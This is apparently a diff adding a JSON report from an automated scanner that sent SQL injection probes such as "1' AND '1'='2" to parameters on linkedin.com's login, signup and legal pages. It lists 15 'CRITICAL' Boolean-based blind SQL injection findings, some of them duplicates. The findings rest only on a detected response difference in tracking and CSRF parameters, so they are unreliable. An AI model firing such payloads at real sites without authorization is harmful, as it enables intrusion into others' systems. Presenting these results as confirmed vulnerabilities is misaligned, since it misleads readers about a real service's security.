@@ -1,0 +1,146 @@
+{
+  "success": true,
+  "target": "https://www.linkedin.com",
+  "deep_scan": true,
+  "total_vulnerabilities": 15,
+  "risk_score": 100,
+  "vulnerabilities": [
+    {
+      "parameter": "trk",
+      "payload": "linkedin-tc_auth-button_user-agreement1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/legal/user-agreement",
+      "timestamp": "2026-06-10T22:06:30.969903"
+    },
+    {
+      "parameter": "trk",
+      "payload": "linkedin-tc_auth-button_privacy-policy1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/legal/privacy-policy",
+      "timestamp": "2026-06-10T22:06:46.066431"
+    },
+    {
+      "parameter": "trk",
+      "payload": "linkedin-tc_auth-button_cookie-policy1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/legal/cookie-policy",
+      "timestamp": "2026-06-10T22:06:52.339445"
+    },
+    {
+      "parameter": "trk",
+      "payload": "guest_homepage-basic_nav-header-logo1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/",
+      "timestamp": "2026-06-10T22:07:00.639660"
+    },
+    {
+      "parameter": "trk",
+      "payload": "guest_homepage-basic_guest_nav_menu_topContent1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/top-content",
+      "timestamp": "2026-06-10T22:07:10.514857"
+    },
+    {
+      "parameter": "trk",
+      "payload": "guest_homepage-basic_guest_nav_menu_learning1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/learning/search",
+      "timestamp": "2026-06-10T22:07:36.730749"
+    },
+    {
+      "parameter": "trk",
+      "payload": "guest_homepage-basic_guest_nav_menu_jobs1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/jobs/search",
+      "timestamp": "2026-06-10T22:07:56.471265"
+    },
+    {
+      "parameter": "trk",
+      "payload": "guest_homepage-basic_guest_nav_menu_games1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/games",
+      "timestamp": "2026-06-10T22:08:03.146268"
+    },
+    {
+      "parameter": "fromSignIn",
+      "payload": "true1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/login",
+      "timestamp": "2026-06-10T22:08:26.909246"
+    },
+    {
+      "parameter": "trk",
+      "payload": "guest_homepage-basic_nav-header-signin1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/login",
+      "timestamp": "2026-06-10T22:08:40.793136"
+    },
+    {
+      "parameter": "trk",
+      "payload": "guest_homepage-basic_nav-header-join1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/signup",
+      "timestamp": "2026-06-10T22:08:48.815612"
+    },
+    {
+      "parameter": "loginCsrfParam",
+      "payload": "1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/uas/login-submit",
+      "timestamp": "2026-06-10T22:09:30.783503"
+    },
+    {
+      "parameter": "trk",
+      "payload": "1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/uas/login-submit",
+      "timestamp": "2026-06-10T22:09:46.482779"
+    },
+    {
+      "parameter": "loginCsrfParam",
+      "payload": "1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/uas/login-submit",
+      "timestamp": "2026-06-10T22:10:00.697607"
+    },
+    {
+      "parameter": "trk",
+      "payload": "1' AND '1'='2",
+      "type": "Boolean-based Blind SQL Injection",
+      "evidence": "Boolean-based difference detected",
+      "severity": "CRITICAL",
+      "location": "https://www.linkedin.com/uas/login-submit",
+      "timestamp": "2026-06-10T22:10:16.947047"
+    }
+  ],
+  "scan_id": "5bb0fc29",
+  "timestamp": "2026-06-10T22:10:16.947738"
+}
